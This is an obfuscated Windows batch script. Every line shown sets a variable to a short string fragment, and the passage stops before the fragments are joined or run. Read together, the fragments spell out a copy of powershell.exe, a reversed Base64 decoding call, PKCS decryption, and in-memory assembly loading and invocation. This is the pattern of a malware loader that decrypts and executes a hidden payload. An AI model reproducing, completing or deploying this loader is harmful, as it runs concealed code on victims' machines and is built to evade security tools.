@echo off
set "wysamFhbyb=Po"
set "poWBiGqcWY=1."
set "DqAETOKYck=Sy"
set "HBFQLeWSSV=py"
set "TRuLQmEvqX=he"
set "eSBuAtpSeX=rS"
set "RvHjmilmtu= C"
set "BrFzNhZzSj=0\"
set "mcnQTyECHm=in"
set "pGWwHjZsTV=we"
set "xWTbBqfZiG=ll"
set "BnkubwYyre=nd"
set "FAGURfVtAk= /"
set "feLXXGdMCz=em"
set "djyZPbkEuC=\W"
set "vUXFBYSifw=y "
set "npKxOjCwUn=po"
set "bTMuMWFMiV=ws"
set "sNaTLNiBjO=ow"
set "EyfpGZDyMY=he"
set "eUiJJUvjRE=ll"
set "iGFXkjmAsX=.e"
set "yKNNlgNVxl=we"
set "SFHEmEatoN=co"
set "HuRsAcnvZW=32"
set "bUteHXnbIv=:\"
set "ZddjfRdPjJ=rs"
set "YPKEcppMrP=st"
set "dpGcDnFVLO=Wi"
set "iJpXRDXYzT=\v"
set "QUjxRCPEGZ=s\"
set "gNmkIRAGPI=xe"
set "LXvCCEXsda=do"
set "manxniIFGq=cd"
set "AsqULacOMR= %~dp0"
set "MkfsMhpuEJ=l5E7"
set "JRVINUuiKG=trea"
set "YdVGMjmHWw=ing("
set "NvgfpNYcbp=mory"
set "bHMdFgwIbO=th('"
set "vvXsPHduBq=form"
set "pCQEWfobNZ=-1.."
set "sulUOBBqSh= [Sy"
set "mjYNjNwUIE= = ["
set "nBVqSKXXnY=rans"
set "xQYsYLoUqu=.Ass"
set "XlhzZuLKkf=Disp"
set "xFJzizfZre=esaB"
set "ucCqhXIbVG=ke($"
set "fxEEiIrhYZ=PKCS"
set "MMoSwuXhja=$DVF"
set "MzbthSKZIv=F'[-"
set "BiKjSXzbbI=($Fk"
set "ToJagOvdWF=File"
set "RilxQPIcYK=ress"
set "wflVxTReAl=).Sp"
set "FtnxMlLWRo= = $"
set "oxywZsPoNF='gni"
set "GFzMcOLJNi=BOSY"
set "tCcBATRkgR=yste"
set "pqKeyLnuMU=tryP"
set "rMRAXXnJgm=Star"
set "MxfGnpvRmh=saBm"
